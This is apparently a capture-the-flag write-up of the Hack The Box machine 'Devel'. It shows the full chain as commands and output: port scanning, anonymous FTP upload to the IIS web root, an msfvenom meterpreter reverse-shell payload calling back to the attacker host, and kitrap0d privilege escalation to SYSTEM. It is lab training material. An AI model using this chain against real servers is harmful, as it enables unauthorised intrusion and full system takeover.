# Devel Writeup

![intro](assets/intro.png)

Target host:
Performed TCP portscan

```go
└──╼ $./rustscan -a 10.10.10.5 -- -sV -sC -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/nath/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.5:21
Open 10.10.10.5:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -A" on ip 10.10.10.5
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-11 18:17 AEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
Initiating Ping Scan at 18:17
Scanning 10.10.10.5 [2 ports]
Completed Ping Scan at 18:17, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:17
Completed Parallel DNS resolution of 1 host. at 18:17, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:17
Scanning 10.10.10.5 [2 ports]
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
Completed Connect Scan at 18:17, 0.51s elapsed (2 total ports)
Initiating Service scan at 18:17
Scanning 2 services on 10.10.10.5
Completed Service scan at 18:17, 6.79s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.5.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:17
NSE: [ftp-bounce 10.10.10.5:21] PORT response: 501 Server cannot accept argument.
Completed NSE at 18:17, 7.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 3.08s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
Nmap scan report for 10.10.10.5
Host is up, received syn-ack (0.32s latency).
Scanned at 2023-04-11 18:17:21 AEST for 18s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:17
Completed NSE at 18:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.22 seconds
```

When I browse to the HTTP server open on port 80, I see the following.
![1](assets/1.png)

It's very clear that this server is a Windows host and is running outdated software, as my Google search results are flooded with ISS 7 exploit POCs

The port scan also shows an FTP server open on port 21.
Before we go any further, let's check if anonymous authentication is enabled on the FTP server.

As seen in the output below, the anonymous user is enabled and anyone can log in with a blank password.
```bash
└──╼ $ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:nath): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Interestingly, it looks like the user also has read and write access to the directory. It is also being used at wwwroot for the web server.
```bash
ftp> put test_file.txt
local: test_file.txt remote: test_file.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client
04-11-23  11:29AM       <DIR>          BEWQBHECDI
03-17-17  05:37PM                  689 iisstart.htm
04-11-23  11:29AM       <DIR>          JPEOMRLDFT
04-11-23  11:32AM       <DIR>          PGMYJXEYHO
04-11-23  11:39AM                 2944 shell.aspx
04-11-23  12:52PM                    0 test_file.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete
```

Effectively this means that I could upload a reverse shell and execute it through the web browser.

From here I generated a reverse shell payload using msfvenom with the following command.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f aspx > shell.aspx
```

## Reverse Shell
I uploaded the reverse shell as seen in the output below.
```bash
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2944 bytes sent in 0.00 secs (15.3422 MB/s)
```

Once the shell was uploaded to the FTP server, I started the meterpreter exploit/multi/handler and browsed to the reverse shell in the IIS root directory.
```bash
[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.5:49172) at 2023-04-11 20:01:15 +1000

(Meterpreter 1)(c:\windows\system32\inetsrv) > shell
Process 560 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

We have a shell!

While the shell was open, I backgrounded the session and performed a search for exploits with the Metasploit exploit suggester.

The following is a list of vulnerabilities that were present on the machine.
```bash
 1   exploit/windows/local/bypassuac_eventvwr
 2   exploit/windows/local/ms10_015_kitrap0d
 3   exploit/windows/local/ms10_092_schelevator
 4   exploit/windows/local/ms13_053_schlamperei
 5   exploit/windows/local/ms13_081_track_popup_menu
 6   exploit/windows/local/ms14_058_track_popup_menu
 7   exploit/windows/local/ms15_004_tswbproxy
 8   exploit/windows/local/ms15_051_client_copy_image
 9   exploit/windows/local/ms16_016_webdav
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc
 11  exploit/windows/local/ms16_075_reflection
 12  exploit/windows/local/ntusermndragover
 13  exploit/windows/local/ppr_flatten_rec
```

## System Shell
At this point, I attempted a few exploits that were partially successful but ended in failure because the session could not be created. Though the machine was vulnerable to a number of these vulnerabilities, not all exploitation primitives existed for many of the exploits on this list. This was one of the major contributing factors as to why a session could be created at the end of a successful exploitation attempt.

After much trial and error though, I found an exploit that actually worked and got me a system shell.
```bash
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> run

[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 3644 launched.
[*] Reflectively injecting the DLL into 3644...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.16.5:4444 -> 10.10.10.5:49173) at 2023-04-11 20:08:25 +1000

(Meterpreter 2)(c:\windows\system32\inetsrv) > shell
Process 1304 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```